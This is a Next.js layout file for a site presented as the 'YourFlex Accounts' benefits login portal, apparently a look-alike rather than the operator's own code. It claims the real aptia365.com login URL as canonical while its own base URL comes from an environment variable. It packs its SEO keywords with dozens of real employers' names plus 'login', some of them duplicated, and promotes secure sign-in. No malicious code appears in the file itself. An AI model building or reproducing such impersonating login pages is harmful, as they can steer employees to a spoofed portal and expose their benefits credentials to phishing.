import type React from "react";
import type { Metadata } from "next";
import { Geist } from "next/font/google";
import { Analytics } from "@vercel/analytics/next";
import "./globals.css";

const geist = Geist({ subsets: ["latin"] });

const CANONICAL_LOGIN_URL =
  "https://yourflexaccounts.aptia365.com/Authentication/Handshake";
const SITE_DOMAIN = "yourflexaccounts.aptia365.com";
const SITE_BRAND = "YourFlex Accounts";

export const metadata: Metadata = {
  metadataBase: new URL(
    process.env.NEXT_PUBLIC_BASE_URL || CANONICAL_LOGIN_URL,
  ),
  title: {
    default: "YourFlex Accounts - Login",
    template: "%s | YourFlex Accounts",
  },
  keywords: [
    "YourFlex Accounts",
    "Aptia 365",
    "yourflexaccounts.aptia365.com",
    "benefits login",
    "employee benefits portal",
    "FSA login",
    "HSA login",
    "COBRA login",
    "account access",
    "health benefits",
    "dependent care",
    "reimbursement account",
    "secure login",
    "participant portal",
    "employer portal",
    "handshake authentication",
    "aptia365",
    "aptia retirement",
    "aptia365 login",
    "aptia365 Mercedes",
    "aptia365 HSA",
    "aptia365 FSA",
    "aptia 365",
    "aptia benefits",
    "aptia",
    "Aptia365 cobra",
    "Aptia365 com 7 eleven" ,
    "Aptia365 mercer ",
    "Aptia365 TCS",
    "Aptia365 Altice",
    "Aptia365 Altice login",
    "Aptia365 Pearson education inc",
    "Aptia365 Pearson education inc login",
    "Aptia365 Parexel International LLC",
    "Aptia365 Parexel International LLC login",
    "Aptia365 Gainwell Technologies",
    "Aptia365 Gainwell Technologies login",
    "Aptia365 TATA Consultancy Services Limited",
    "Aptia365 TATA Consultancy Services Limited login",
    "Aptia365 Marsh McLennan",
    "Aptia365 Marsh McLennan login",
    "Aptia365 Gainwell Technologies",
    "Aptia365 Gainwell Technologies login",
    "Aptia365 American Residential Services",
    "Aptia365 American Residential Services login",
    "Aptia365 7-eleven",
    "Aptia365 7-eleven login",
    "Aptia365 ABB Inc",
    "Aptia365 ABB Inc login",
    "Aptia365 Envista",
    "Aptia365 Envista login",
    "Aptia365 Cushman & Wakefield",
    "Aptia365 Cushman & Wakefield login",
    "Aptia365 WinnCompanies LLC",
    "Aptia365 WinnCompanies LLC login",
    "Aptia365 Horace Mann",
    "Aptia365 Horace Mann login",
    "Aptia365 PCC Structurals Inc",
    "Aptia365 PCC Structurals Inc login",
    "Aptia365 GEA",
    "Aptia365 GEA login",
    "Aptia365 FormFactor Inc.",
    "Aptia365 FormFactor Inc. login",
    "Aptia365 Evonik",
    "Aptia365 Evonik login",
    "Aptia365 Transamerica",
    "Aptia365 Transamerica login",
    "Aptia365 CareOregon",
    "Aptia365 CareOregon login",
    "Aptia365 Aegis",
    "Aptia365 Aegis login",
    "Aptia365 Motorola Solutions",
    "Aptia365 Motorola Solutions login",
    "Aptia365 Under Armour",
    "Aptia365 Under Armour login",
    "Aptia365 Valvoline LLC",
    "Aptia365 Valvoline LLC login",
    "Aptia365 Chevron Stations Inc",
    "Aptia365 Chevron Stations Inc login",
    "Aptia365 Hill International Inc",
    "Aptia365 Hill International Inc login",
    "Aptia365 Ultradent Products Inc",
    "Aptia365 Ultradent Products Inc login",
    "Aptia365 Saudi Aramco Americas",
    "Aptia365 Saudi Aramco Americas login",
    "Aptia365 Johns Hopkins University",
    "Aptia365 Johns Hopkins University login",
    "Aptia365 Mercedes-Benz U.S. International",
    "Aptia365 Mercedes-Benz U.S. International login",
    "Aptia365 Transamerica",
    "Aptia365 Transamerica login",
    "Aptia365 Pearson Education Inc",
    "Aptia365 Pearson Education Inc login",
    "Aptia365 Capital One",
    "Aptia365 Capital One login",
    "Aptia365 Mount St. Mary's University",
    "Aptia365 Mount St. Mary's University login",
    "Aptia365 AvalonBay Communities",
    "Aptia365 AvalonBay Communities login",
    "Aptia365 MERS",
    "Aptia365 MERS login",
    "Aptia365 Lifespan",
    "Aptia365 Lifespan login",
    "Aptia365 ManTech International Corporation",
    "Aptia365 ManTech International Corporation login",
    "Aptia365 Altice",
    "Aptia365 Altice login",
    "Aptia365 Kellogg's",
    "Aptia365 Kellogg's login",
    "Aptia365 Orlando Health",
    "Aptia365 Orlando Health login",
    "Aptia365 PF Holdings",
    "Aptia365 PF Holdings login",
    "Aptia365 Ultradent Products",
    "Aptia365 Ultradent Products login",
    "Aptia365 Peet's Coffee & Tea",
    "Aptia365 Peet's Coffee & Tea login",
  ],
  description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through YourFlex Accounts.`,

  authors: [{ name: "YourFlex Accounts" }],
  creator: "YourFlex Accounts",
  publisher: "YourFlex Accounts",
  applicationName: SITE_BRAND,
  referrer: "origin-when-cross-origin",
  robots: {
    index: true,
    follow: true,
    googleBot: {
      index: true,
      follow: true,
      "max-video-preview": -1,
      "max-image-preview": "large",
      "max-snippet": -1,
    },
  },
  openGraph: {
    type: "website",
    locale: "en_US",
    title: "YourFlex Accounts - Login",
    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through YourFlex Accounts.`,
    siteName: SITE_BRAND,
    url: CANONICAL_LOGIN_URL,
    images: [
      {
        url: "/favicon-32x32.png",
        width: 32,
        height: 32,
        alt: `${SITE_BRAND}`,
      },
    ],
  },
  twitter: {
    card: "summary",
    title: "YourFlex Accounts - Login",
    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through YourFlex Accounts.`,
    images: ["/favicon-32x32.png"],
  },
  icons: {
    icon: "/favicon-32x32.png",
    shortcut: "/favicon-32x32.png",
    apple: "/favicon-32x32.png",
  },
  viewport: {
    width: "device-width",
    initialScale: 1,
    maximumScale: 5,
  },
  themeColor: "#254650",
  category: "Business",
  alternates: {
    canonical: CANONICAL_LOGIN_URL,
    languages: {
      "en-US": CANONICAL_LOGIN_URL,
    },
  },
  other: {
    "geo.region": "US",
  },
};

const jsonLd = {
  "@context": "https://schema.org",
  "@type": "WebSite",
  name: SITE_BRAND,
  url: CANONICAL_LOGIN_URL,
  description:
    "YourFlex Accounts sign in portal. Login to manage your health and dependent care benefits, view account resources, and access your YourFlex Accounts profile.",
  publisher: {
    "@type": "Organization",
    name: "YourFlex Accounts",
  },
  inLanguage: "en-US",
  potentialAction: {
    "@type": "SearchAction",
    target: { "@type": "EntryPoint", url: CANONICAL_LOGIN_URL },
    "query-input": "required name=search_term_string",
  },
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="en-US">
      <head>
        <link
          href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap"
          rel="stylesheet"
        />
      </head>
      <body className={`${geist.className} font-sans antialiased`}>
        <script
          type="application/ld+json"
          dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }}
        />
        {children}
        <Analytics />
      </body>
    </html>
  );
}
